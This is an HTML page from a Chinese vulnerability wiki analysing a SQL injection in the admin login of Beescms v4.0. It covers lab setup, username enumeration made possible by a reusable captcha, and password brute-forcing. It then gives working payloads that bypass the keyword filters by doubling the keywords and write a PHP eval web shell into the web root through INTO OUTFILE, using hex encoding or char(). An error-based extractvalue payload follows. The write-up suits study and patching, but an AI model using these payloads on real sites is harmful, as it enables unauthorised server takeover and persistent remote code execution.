<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Beescms/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Beescms_v4.0 sql注入漏洞分析 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Beescms_v4.0 sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u4e09\u3001\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c", url: "#_3" },
              {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u65b9\u6cd5\u4e00\u3001Hex\u7f16\u7801", url: "#hex" },
              {title: "\u65b9\u6cd5\u4e8c\u3001\u4f7f\u7528char\u51fd\u6570", url: "#char" },
              {title: "\u540e\u8bb0:", url: "#_6" },
              {title: "\u53c2\u8003:", url: "#_7" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Bitbucket/Bitbucket%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Bitbucket/Bitbucket%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Bitbucket 登录绕过漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Bazarr/Bazarr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2024-40348%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Bazarr/Bazarr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2024-40348%29/" class="btn btn-xs btn-link">
        Bazarr任意文件读取(CVE-2024-40348)
      </a>
    </div>
    
  </div>

    

    <h1 id="beescms_v40-sql">Beescms_v4.0 sql注入漏洞分析<a class="headerlink" href="#beescms_v40-sql" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Beescms v4.0由于后台登录验证码设计缺陷以及代码防护缺陷导致存在bypass全局防护的SQL注入。</p>
<h2 id="_2">二、漏洞环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>官方下载Beescms v4.0,下载地址: <a href="http://beescms.com/cxxz.html">http://beescms.com/cxxz.html</a></p>
<p>解压压缩文件,然后把文件放到phpstudy的网站根目录</p>
<p>浏览器访问http://192.168.10.171/beescms/install,开始安装</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122335715-1618148630.png" /></p>
<p>一直下一步,出现如下界面,输入数据库账户密码</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122356337-306690899.png" /></p>
<p>成功安装</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122419971-872330501.png" /></p>
<p>修改<code>mysql.ini</code> 文件，在<code>\[mysqld\]</code>下添加条目: <code>secure\_file\_priv =</code>,保存然后重启phpstudy,不然用mysql写入文件会报错。</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122435778-1906379801.png" /></p>
<h2 id="_3">三、漏洞影响版本<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>Beescms v4.0</p>
<h2 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>浏览器访问后台页面http://192.168.10.171/beescms/admin/</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122514195-496659534.png" /></p>
<p>任意输入用户名和密码,看到提示“不存在该管理用户”,可以枚举用户名,然后根据枚举出来的用户名爆破密码</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122530619-461291317.png" /></p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122538518-1336679652.png" /></p>
<p>burpsuit枚举用户名,可以看到该验证码存在设计缺陷漏洞,一次验证后在不刷新的情况下可以多次提交请求,最终导致攻击者可以进行模糊测试(暴力枚举)。</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122609807-1280708811.png" /></p>
<p>根据枚举出来的用户名,然后枚举密码,可以看到成功枚举密码</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122630057-482682805.png" /></p>
<p>在用户名处输入单引号,报错,说明存在sql注入漏洞</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122656241-1132794688.png" /></p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122707556-1196366536.png" /></p>
<p>查看源码,发现使用<code>f1\_value</code>函数和<code>f1\_html</code>函数对输入的用户名和密码进行过滤</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122723150-496185350.png" /></p>
<p>跟进<code>f1\_value</code>函数,发现<code>f1\_value</code>函数对输入的关键字进行了过滤,可以看到,几乎常见的SQL关键字都被过滤掉了。</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122741912-863664474.png" /></p>
<p>跟进<code>f1\_html</code>函数,发现使用<code>htmlspecialchars</code>函数对输入的特殊符号进行<code>html</code>实体化转义,主要用于防御XSS漏洞</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122800720-916461982.png" /></p>
<p>百度搜索<code>htmlspecialchars</code>函数,发现<code>htmlspecialchars</code>函数默认情况下只对双引号进行编码,可以看到这个版本的cms使用默认对参数进行过滤处理,此处存在单引号引入的漏洞。</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122830980-305864183.png" /></p>
<p>继续浏览代码,发现登录验证函数<code>check\_login</code></p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122848946-293719866.png" /></p>
<p>跟进<code>check\_login</code>函数,发现<code>check\_login</code>函数在验证用户是先验证用户名,然后验证密码是否正确,该处验证逻辑存在漏洞。</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122912897-212972888.png" /></p>
<h3 id="_5">手工模糊测试<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>手工测试发现<code>union select</code>等关键字被过滤</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122930776-2099732252.png" /></p>
<p>通过上面的分析源码,发现bypass的方法</p>
<div class="highlight"><pre><span></span><code><span class="k">union</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">uni</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">on</span>

<span class="k">select</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">selselectect</span>
</code></pre></div>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828122948155-204916356.png" /></p>
<p>猜解SQL查询语句中的字段数,根据如下图所示,判断出SQL查询语句中的字段数为5</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123005523-1902634535.png" /></p>
<p>尝试通过<code>SQL</code>注入<code>getshell</code></p>
<p>写入一句话到目标网站根目录下,<code>payload</code>如下:</p>
<div class="highlight"><pre><span></span><code><span class="k">admin</span><span class="o">%</span><span class="mi">27</span><span class="w"> </span><span class="n">un</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="n">ion</span><span class="w"> </span><span class="n">selselectect</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="o">&lt;</span><span class="nv">?</span><span class="n">php</span><span class="w"> </span><span class="nv">@eval</span><span class="p">(</span><span class="n">$</span><span class="err">\</span><span class="n">_POST</span><span class="err">\[</span><span class="n">cmd</span><span class="err">\]</span><span class="p">);</span><span class="nv">?</span><span class="o">&gt;</span><span class="w"> </span><span class="k">into</span><span class="w">  </span><span class="k">outfile</span><span class="w"> </span><span class="s1">&#39;C:/phpStudy/WWW/beescms/shell.php&#39;</span><span class="c1">#</span>
</code></pre></div>
<p>在burpsuit抓包,修改包并重放,提示如下错误,根据返回的数据包可以看到由于<code>htmlspecialchars</code>函数对输入的特殊符号进行html实体化转义,还有就是<code>into</code>、<code>outfile</code>关键字被过滤</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123022227-1424726596.png" /></p>
<p>手工测试<code>bypass</code>关键字过滤防护</p>
<div class="highlight"><pre><span></span><code><span class="k">outfile</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">outoutfilefile</span>

<span class="k">into</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">into</span>
</code></pre></div>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123042332-360149153.png" /></p>
<p>通过上面的分析,发现php函数<code>htmlspecialchars()</code>对输入中含有的特殊符号进行html实体化转义,导致不能写shell到目标服务器上。可以通过利用mysql注入的一个特性就可以达到注入效果(即对shell部分进行Hex编码),或者用mysql函数char()就可以绕过这里的限制。</p>
<h2 id="hex">方法一、Hex编码<a class="headerlink" href="#hex" title="Permanent link">&para;</a></h2>
<p>对shell部分进行编码</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123111496-2002992180.png" /></p>
<p>写入shell的payload为:注意:记得在编码转换的时候前面加<code>0x</code>或者直接用<code>unhex</code>函数</p>
<p><code>unhex(3c3f70687020406576616c28245f504f53545b636d645d293b3f3e)</code>,但是本次实验用<code>unhex</code>函数一直失败</p>
<div class="highlight"><pre><span></span><code><span class="k">admin</span><span class="s1">&#39; uni union on selselectect null,null,null,null,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e  in into  outoutfilefile &#39;</span><span class="n">C</span><span class="o">:/</span><span class="n">phpStudy</span><span class="o">/</span><span class="n">WWW</span><span class="o">/</span><span class="n">beescms</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;#</span>
</code></pre></div>
<p>burp修改数据包,成功写入shell</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123201443-1123090542.png" /></p>
<p>菜刀连接</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123216674-1934691201.png" /></p>
<h2 id="char">方法二、使用char函数<a class="headerlink" href="#char" title="Permanent link">&para;</a></h2>
<p>mysql内置函数<code>char()</code>可以将里边的<code>ascii</code>码参数转换为字符串,使用<code>python</code>实现快速转换</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123236295-1625110644.png" /></p>
<p>构造payload,payload为:</p>
<div class="highlight"><pre><span></span><code><span class="k">admin</span><span class="s1">&#39; uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62)  in into  outoutfilefile &#39;</span><span class="n">C</span><span class="o">:/</span><span class="n">phpStudy</span><span class="o">/</span><span class="n">WWW</span><span class="o">/</span><span class="n">beescms</span><span class="o">/</span><span class="n">cmd</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;#</span>
</code></pre></div>
<p>burp修改数据包,成功写入shell</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123251429-581296420.png" /></p>
<p>菜刀连接</p>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123408066-991061693.png" /></p>
<h2 id="_6">后记:<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<p>经过测试,发现<code>user</code>字段除了存在布尔注入,还存在报错注入</p>
<p>构造payload,payload如下:</p>
<div class="highlight"><pre><span></span><code><span class="k">admin</span><span class="s1">&#39; a and nd extractvalue(1,concat(0x7e,(select user()),0x7e))#</span>
</code></pre></div>
<p><img alt="" src="../resource/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/media/1592114-20190828123430077-287558734.png" /></p>
<h2 id="_7">参考:<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
<p><a href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p>
<p><a href="https://www.ohlinge.cn/php/beescms_sqli.html">https://www.ohlinge.cn/php/beescms_sqli.html</a></p>
<p><a href="https://www.ohlinge.cn/php/beescms_login_sql.html">https://www.ohlinge.cn/php/beescms_login_sql.html</a></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Bitbucket/Bitbucket%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Bitbucket/Bitbucket%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Bitbucket 登录绕过漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Bazarr/Bazarr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2024-40348%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Bazarr/Bazarr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%28CVE-2024-40348%29/" class="btn btn-xs btn-link">
        Bazarr任意文件读取(CVE-2024-40348)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>